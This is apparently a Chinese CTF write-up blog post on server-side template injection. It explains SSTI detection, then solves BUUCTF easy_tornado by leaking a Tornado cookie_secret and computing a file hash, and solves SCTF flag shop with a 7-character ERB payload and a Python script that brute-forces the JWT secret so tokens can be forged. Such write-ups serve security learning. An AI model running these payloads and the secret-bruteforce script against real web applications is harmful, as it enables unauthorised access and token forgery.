<li><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
</li>
<li><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<h1 id="BUUCT-WEB-easy-tornado"><a href="#BUUCT-WEB-easy-tornado" class="headerlink" title="BUUCT-WEB-easy_tornado"></a>BUUCT-WEB-easy_tornado</h1></li>
<li><p>tornado是python中的一个web应用框架。拿到题目发现有三个文件:flag.txt,welcome.txt,hints.txt.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/flag.txt:flag in /flllllllllllag</span><br><span class="line">/welcome.txt:render</span><br><span class="line">/hints:md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
</li>
<li><p>看看url，发现web9.buuoj.cn/file?filename=/flag.txt&amp;filehash=245a5ccf5543f16709d8c22851af5454<br>把filename改成/fllllllllllllag试试，进入一个报错页面。url也很有意思<code>buuoj.cn/error?msg=Error</code>.</p>
</li>
<li><p>试着把msg的值改成123看看，成功输出到页面。再结合提示render(大佬wp提示模板注入)，<code>msg=,得到cookie_secret:&quot;M)Z.&gt;}{O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&quot;</code></p>
</li>
<li><p>再利用hints.txt提示,得到filehash的值.脚本如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import hashlib</span><br><span class="line"> </span><br><span class="line">def md5value(s):</span><br><span class="line">    md5 = hashlib.md5() </span><br><span class="line">    md5.update(s) </span><br><span class="line">    return md5.hexdigest()</span><br><span class="line"> </span><br><span class="line">def jiami(): </span><br><span class="line">    filename = &apos;/fllllllllllllag&apos;</span><br><span class="line">    cookie_s =&quot;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&quot;</span><br><span class="line">    print(md5value(filename.encode(&apos;utf-8&apos;)))</span><br><span class="line">    x=md5value(filename.encode(&apos;utf-8&apos;))</span><br><span class="line">    y=cookie_s+x</span><br><span class="line">    print(md5value(y.encode(&apos;utf-8&apos;)))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">jiami()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="sctf-flag-shop"><a href="#sctf-flag-shop" class="headerlink" title="sctf flag shop"></a>sctf flag shop</h1><ul>
<li><p>在cookie中发现有jwt，解密发现所拥有的jkl是受cookie控制的，所以思路很清楚我们需要去伪造cookie.</p>
</li>
<li><p>在robots.txt中发现原始码泄漏，访问filebak获取到原始码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">require &apos;sinatra&apos;</span><br><span class="line">require &apos;sinatra/cookies&apos;</span><br><span class="line">require &apos;sinatra/json&apos;</span><br><span class="line">require &apos;jwt&apos;</span><br><span class="line">require &apos;securerandom&apos;</span><br><span class="line">require &apos;erb&apos;</span><br><span class="line"></span><br><span class="line">set :public_folder, File.dirname(__FILE__) + &apos;/static&apos;</span><br><span class="line"></span><br><span class="line">FLAGPRICE = 1000000000000000000000000000</span><br><span class="line">#ENV[&quot;SECRET&quot;] = SecureRandom.hex(xx)</span><br><span class="line"></span><br><span class="line">configure do</span><br><span class="line">  enable :logging</span><br><span class="line">  file = File.new(File.dirname(__FILE__) + &apos;/../log/http.log&apos;,&quot;a+&quot;)</span><br><span class="line">  file.sync = true</span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/&quot; do</span><br><span class="line">  redirect &apos;/shop&apos;, 302</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/filebak&quot; do</span><br><span class="line">  content_type :text</span><br><span class="line">  erb IO.binread __FILE__</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/auth&quot; do</span><br><span class="line">  payload = &#123; uid: SecureRandom.uuid , jkl: 20&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">  cookies[:auth] = auth</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/api/info&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">  json(&#123;uid: auth[0][&quot;uid&quot;],jkl: auth[0][&quot;jkl&quot;]&#125;)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/shop&quot; do</span><br><span class="line">  erb :shop</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &quot;/work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line">  auth = auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] == &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] = auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&apos;#&#123;params[:name][0,7]&#125; working successfully!&apos;)&lt;/script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &quot;/shop&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &apos;HS256&apos; &#125;</span><br><span class="line"></span><br><span class="line">  if auth[0][&quot;jkl&quot;] &lt; FLAGPRICE then</span><br><span class="line"></span><br><span class="line">    json(&#123;title: &quot;error&quot;,message: &quot;no enough jkl&quot;&#125;)</span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[&quot;SECRET&quot;] , &apos;HS256&apos;</span><br><span class="line">    cookies[:auth] = auth</span><br><span class="line">    json(&#123;title: &quot;success&quot;,message: &quot;jkl is good thing&quot;&#125;)</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def islogin</span><br><span class="line">  if cookies[:auth].nil? then</span><br><span class="line">    redirect to(&apos;/shop&apos;)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
</li>
<li><p>发现在work这个路由中，有:<code>ERB::new(&quot;&lt;script&gt;alert(&#39;#{params[:name][0,7]} working successfully!&#39;)&lt;/script&gt;&quot;).result</code>，这里的<code>#{params[:name][0,7]}</code>我们可控，所以这里有一个模版注入，但是有限制：我们的payload不能超过7个字符。</p>
</li>
<li><p>去网上查找ERB模版的写法，寻找到了ruby其中的一个模版标签：&lt;%=xx%&gt;，但是因为长度的限制，我们只有2个字符可用.</p>
</li>
<li><p>可以从原始码得到，我们的需要的SECRET是在环境变量中，但是ENV不满足条件，考虑从ruby预定义的变量入手：<a href="https://docs.ruby-lang.org/zh/2.4.0/globals_rdoc.html" target="_blank" rel="noopener">https://docs.ruby-lang.org/zh/2.4.0/globals_rdoc.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(/[0-9a-z]+/)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>上面正好有匹配ENV [“ SECRET”]的地方，所以利用$` 和 $’.构造name为 &lt;%=$<del>%&gt; ，do为 &lt;%=$</del>%&gt; is working.其中的 SECRET 参数可控，如果匹配到SECRET，则 $~ (ruby特性，表示最近一次正则匹配结果) 会在页面中返回，于是可以爆破secret，然后伪造JWT去买flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">table = &apos;1234567890abcdef&apos;</span><br><span class="line">url = &apos;http://47.110.15.101/work&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;name&quot;: &quot;&lt;%=$~%&gt;&quot;,</span><br><span class="line">    &quot;do&quot;: &quot;&lt;%=$~%&gt; is working&quot;</span><br><span class="line">&#125;</span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.headers[&apos;Cookie&apos;] = &apos;auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIwZmQxMjUzNC1mMmJjLTRhZTUtOTRhNy1kNmUwZWRjMGJkMzEiLCJqa2wiOjEwN30.iI0fcdikWuFxSxYm9LV1dNjCmmID48QZ0c3w-hhyEnw&apos;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#后半部分</span><br><span class="line">key = &apos;&apos;</span><br><span class="line">for _ in range(1000):</span><br><span class="line">    for i in table:</span><br><span class="line">        tmp = key</span><br><span class="line">        tmp += i</span><br><span class="line">        data[&apos;SECRET&apos;] = tmp</span><br><span class="line">        print(tmp)</span><br><span class="line">        res = sess.get(url, data=data)</span><br><span class="line">        print(res.text)</span><br><span class="line">        if tmp in res.text:</span><br><span class="line">            key += i</span><br><span class="line">            print(key)</span><br><span class="line">            break</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#前半部分</span><br><span class="line">key = &apos;17b51f7f2588b3d2f09c821e6499984b09810e652ce9fa4882fe4875c8&apos;</span><br><span class="line">for _ in range(1000):</span><br><span class="line">    for i in table:</span><br><span class="line">        tmp = key</span><br><span class="line">        tmp = i + tmp</span><br><span class="line">        data[&apos;SECRET&apos;] = tmp</span><br><span class="line">        res = sess.get(url, data=data)</span><br><span class="line">        if tmp in res.text:</span><br><span class="line">            key = i + key</span><br><span class="line">            print(key)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
</search>
